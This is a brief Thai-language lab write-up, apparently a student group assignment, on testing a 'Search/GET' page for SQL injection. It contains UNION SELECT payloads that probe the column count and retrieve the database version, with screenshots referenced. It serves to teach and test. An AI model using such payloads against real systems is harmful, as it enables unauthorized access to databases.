
## SQL Injection (Search/GET) ##

รายชื่อกลุ่ม 
1. Mr.Wisanu  Sameejeang
2. Mr.Tossaporn Hansing
3. Mr.Sirimongkol wongfu


ทดสอบการ Search/Get)

โดยการกด Seacrch ก่อนแล้วดูการแสดงผล

<br>![pic1](/pic/sqli1_1.jpg)<br>

ทดสอบช่องโหว่
โดยการใส่ค่า  'union select 1,2,3,4,5,6,7 -- -
<br>![pic2](/pic/sqli1_2.jpg)<br>

ทดสอบโดยการหา version databases โดยการใส่ค่า 'union select 1,2,3,4,version(),6,7 -- -
<br>![pic3](/pic/sqli1_3.jpg)<br>
